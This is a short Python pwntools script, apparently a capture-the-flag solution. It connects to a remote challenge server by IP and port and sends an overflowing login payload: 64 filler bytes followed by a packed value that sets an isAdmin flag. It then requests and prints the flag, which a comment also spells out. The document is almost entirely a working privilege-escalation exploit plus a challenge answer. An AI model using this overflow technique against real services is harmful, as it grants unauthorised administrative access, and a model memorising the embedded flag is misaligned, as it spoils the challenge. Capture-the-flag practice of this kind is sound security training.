#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
p = remote("74.234.198.209", 33243)

payload = b""
payload += p8(1) # login
payload += p8(0xff)
payload += b"A" * 64
payload += p64(1) # isAdmin
p.sendline(payload)

payload = b""
payload += p8(3) # flag
payload += p8(0)
p.sendline(payload)

p.readuntil(b"THC{")
print("THC{" + p.readuntil(b"}").decode()) # THC{C4r3fUL_w17h_1N7_0v3rf10w_U51n9_C_1N_G0}
